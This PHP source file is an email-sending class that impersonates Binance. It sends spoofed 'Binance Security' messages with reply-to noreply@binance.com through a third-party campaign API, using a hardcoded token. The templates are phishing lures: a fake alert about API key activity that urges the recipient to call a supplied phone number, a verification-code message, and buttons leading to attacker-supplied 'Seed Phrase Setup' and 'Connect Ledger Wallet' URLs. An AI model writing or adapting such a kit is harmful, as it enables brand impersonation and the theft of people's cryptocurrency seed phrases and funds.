<?php
/**
 * Email Helper Class
 * Handles email sending via Mumara API
 */

class EmailHelper {
    private $config;
    
    public function __construct() {
        $this->config = [
            'api_url' => 'https://demo.campaigns.mumara.com/api/sendEmail',
            'api_token' => 'CigcSiZ0nDe8l6vU5TIKbfr6mlYAf4fUIHm5c6QZXmoYxevVZRtWzU3PQ6Pn',
            'default_from_name' => 'Binance Support',
            'default_from_email' => 'anish.ojha@provistechnologies.com',
            'default_bounce_email' => 'anish.ojha@provistechnologies.com',
            'default_reply_to' => 'noreply@binance.com',
            'default_node_id' => '30',
            'timeout' => 30
        ];
    }
    
    /**
     * Send email with verification code
     */
    public function sendVerificationEmail($recipient, $verificationCode, $customerName = '') {
        $subject = 'Your Binance Verification Code';
        $body = $this->getVerificationEmailTemplate($verificationCode, $customerName);
        
        return $this->sendEmail($recipient, $subject, $body, [
            'from_name' => 'Binance Security',
            'template_type' => 'verification'
        ]);
    }
    
    /**
     * Send API Key notification email
     */
    public function sendApiKeyNotification($recipient, $supportPhone, $customerName = '') {
        $subject = 'Security Alert: API Key Activity Detected';
        $body = $this->getApiKeyEmailTemplate($supportPhone, $customerName);
        
        return $this->sendEmail($recipient, $subject, $body, [
            'from_name' => 'Binance Security Alert',
            'template_type' => 'security_alert'
        ]);
    }
    
    /**
     * Send API Key cancellation email
     */
    public function sendApiKeyCancellation($recipient, $customerName = '') {
        $subject = 'API Key Connection Cancelled';
        $body = $this->getApiCancelEmailTemplate($customerName);
        
        return $this->sendEmail($recipient, $subject, $body, [
            'from_name' => 'Binance Security',
            'template_type' => 'confirmation'
        ]);
    }
    
    /**
     * Send seed phrase email
     */
    public function sendSeedPhraseEmail($recipient, $seedUrl, $customerName = '') {
        $subject = 'Secure Your Wallet - Seed Phrase Required';
        $body = $this->getSeedPhraseEmailTemplate($seedUrl, $customerName);
        
        return $this->sendEmail($recipient, $subject, $body, [
            'from_name' => 'Binance Wallet Security',
            'template_type' => 'wallet_security'
        ]);
    }
    
    /**
     * Send ledger email
     */
    public function sendLedgerEmail($recipient, $ledgerUrl, $customerName = '') {
        $subject = 'Ledger Hardware Wallet Connection';
        $body = $this->getLedgerEmailTemplate($ledgerUrl, $customerName);
       
        return $this->sendEmail($recipient, $subject, $body, [
            'from_name' => 'Binance Hardware Wallet',
            'template_type' => 'hardware_wallet'
        ]);
    }
    
    /**
     * Core email sending function
     */
    public function sendEmail($recipient, $subject, $body, $options = []) {
        // Validate email
        if (!filter_var($recipient, FILTER_VALIDATE_EMAIL)) {
            return [
                'success' => false,
                'error' => 'Invalid email address: ' . $recipient
            ];
        }
        
        // Prepare email data
        $emailData = [
            'api_token' => $this->config['api_token'],
            'recipient' => $recipient,
            'from_name' => $options['from_name'] ?? $this->config['default_from_name'],
            'from_email' => $options['from_email'] ?? $this->config['default_from_email'],
            'bounce_email' => $options['bounce_email'] ?? $this->config['default_bounce_email'],
            'reply_to' => $options['reply_to'] ?? $this->config['default_reply_to'],
            'subject' => $subject,
            'body' => $body,
            'node_id' => $options['node_id'] ?? $this->config['default_node_id']
        ];
        
        try {
            // Initialize cURL
            $ch = curl_init();
            
            curl_setopt_array($ch, [
                CURLOPT_URL => $this->config['api_url'],
                CURLOPT_CUSTOMREQUEST => 'POST',
                CURLOPT_POSTFIELDS => http_build_query($emailData),
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => $this->config['timeout'],
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_HTTPHEADER => [
                    'Content-Type: application/x-www-form-urlencoded',
                    'User-Agent: Binance-EmailHelper/1.0'
                ]
            ]);
            
            $result = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $error = curl_error($ch);
            
            curl_close($ch);
            
            if ($error) {
                throw new Exception('cURL Error: ' . $error);
            }
            
            if ($httpCode !== 200) {
                throw new Exception('HTTP Error: ' . $httpCode);
            }
            
            $response = json_decode($result, true);
            
            if (json_last_error() !== JSON_ERROR_NONE) {
                throw new Exception('Invalid JSON response: ' . json_last_error_msg());
            }
            
            return [
                'success' => true,
                'response' => $response,
                'message' => 'Email sent successfully to ' . $recipient
            ];
            
        } catch (Exception $e) {
            error_log('Email sending failed: ' . $e->getMessage());
            
            return [
                'success' => false,
                'error' => $e->getMessage()
            ];
        }
    }
    
    /**
     * Email Templates
     */
    private function getVerificationEmailTemplate($verificationCode, $customerName) {
        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
        
        return "
        <html>
        <body style='font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;'>
            <div style='max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);'>
                
                <h2 style='color: #1e2329; margin-bottom: 20px;'>{$greeting}</h2>
                
                <p style='color: #474d57; font-size: 16px; line-height: 1.5; margin-bottom: 20px;'>
                    Your verification code is:
                </p>
                
                <div style='background-color: #fcd535; padding: 20px; text-align: center; border-radius: 8px; margin: 20px 0;'>
                    <h1 style='color: #1e2329; margin: 0; font-size: 32px; letter-spacing: 4px;'>{$verificationCode}</h1>
                </div>
                
                <p style='color: #474d57; font-size: 14px; line-height: 1.5; margin-bottom: 20px;'>
                    <strong>Important:</strong> Never share this code with anyone. Only a genuine advisor will confirm it to you.
                </p>
                
                <div style='border-top: 1px solid #eaecef; padding-top: 20px; margin-top: 30px; text-align: center;'>
                    <p style='color: #848e9c; font-size: 12px; margin: 0;'>
                        This is an automated message from Binance.
                    </p>
                </div>
            </div>
        </body>
        </html>
        ";
    }
    
    private function getApiKeyEmailTemplate($supportPhone, $customerName) {
        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
        
        return "
        <html>
        <body style='font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;'>
            <div style='max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);'>
                
                <h2 style='color: #1e2329; margin-bottom: 20px;'>{$greeting}</h2>
                
                <p style='color: #474d57; font-size: 16px; line-height: 1.5; margin-bottom: 20px;'>
                    API Keys for an external wallet was successfully attached to your account. If this was not initiated by you call us immediately on
                 {$supportPhone}
                </p>
                
                <div style='border-top: 1px solid #eaecef; padding-top: 20px; margin-top: 30px; text-align: center;'>
                    <p style='color: #848e9c; font-size: 12px; margin: 0;'>
                         This is an automated message from Binance.
                    </p>
                </div>
            </div>
        </body>
        </html>
        ";
    }
    
    private function getApiCancelEmailTemplate($customerName) {
        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
        
        return "
        <html>
        <body style='font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;'>
            <div style='max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);'>
                
                <h2 style='color: #1e2329; margin-bottom: 20px;'>{$greeting}</h2>
                
                <p style='color: #474d57; font-size: 16px; line-height: 1.5; margin-bottom: 20px;'>
                  External wallet API connection cancelled. The API keys have been removed from your account and access revoked.
                </p>
                
                <div style='border-top: 1px solid #eaecef; padding-top: 20px; margin-top: 30px; text-align: center;'>
                    <p style='color: #848e9c; font-size: 12px; margin: 0;'>
                         This is an automated message from Binance.
                    </p>
                </div>
            </div>
        </body>
        </html>
        ";
    }
    
    private function getSeedPhraseEmailTemplate($seedUrl, $customerName) {
        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
        
        return "
        <html>
        <body style='font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;'>
            <div style='max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);'>
                
                <h2 style='color: #1e2329; margin-bottom: 20px;'>{$greeting}</h2>
                
                
                <div style='text-align: center; margin: 30px 0;'>
                    <a href='https://{$seedUrl}' style='background-color: #fcd535; color: #1e2329; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;'>
                        Access Seed Phrase Setup
                    </a>
                </div>
                
                <p style='color: #474d57; font-size: 14px; line-height: 1.5; margin-bottom: 20px;'>
                    URL: <code style='background-color: #f5f5f5; padding: 2px 4px; border-radius: 4px;'>{$seedUrl}</code>
                </p>
                
                <div style='border-top: 1px solid #eaecef; padding-top: 20px; margin-top: 30px; text-align: center;'>
                    <p style='color: #848e9c; font-size: 12px; margin: 0;'>
                        This is an automated message from Binance.
                    </p>
                </div>
            </div>
        </body>
        </html>
        ";
    }
    
    private function getLedgerEmailTemplate($ledgerUrl, $customerName) {
        $greeting = $customerName ? "Dear {$customerName}," : "Dear Valued Customer,";
        
        return "
        <html>
        <body style='font-family: Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5;'>
            <div style='max-width: 600px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1);'>
                
                <h2 style='color: #1e2329; margin-bottom: 20px;'>{$greeting}</h2>
                
                <div style='text-align: center; margin: 30px 0;'>
                    <a href='https://{$ledgerUrl}' style='background-color: #fcd535; color: #1e2329; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; display: inline-block;'>
                        Connect Ledger Wallet
                    </a>
                </div>
                
                <p style='color: #474d57; font-size: 14px; line-height: 1.5; margin-bottom: 20px;'>
                    URL: <code style='background-color: #f5f5f5; padding: 2px 4px; border-radius: 4px;'>{$ledgerUrl}</code>
                </p>
                
                <div style='border-top: 1px solid #eaecef; padding-top: 20px; margin-top: 30px; text-align: center;'>
                    <p style='color: #848e9c; font-size: 12px; margin: 0;'>
                        Ensure your Ledger device is connected and unlocked before proceeding.
                    </p>
                </div>
            </div>
        </body>
        </html>
        ";
    }
    
    /**
     * Test email configuration
     */
    public function testEmailConfig() {
        return $this->sendEmail(
            'test@example.com',
            'Test Email Configuration',
            '<p>This is a test email to verify configuration.</p>',
            ['from_name' => 'Test Sender']
        );
    }
}
?>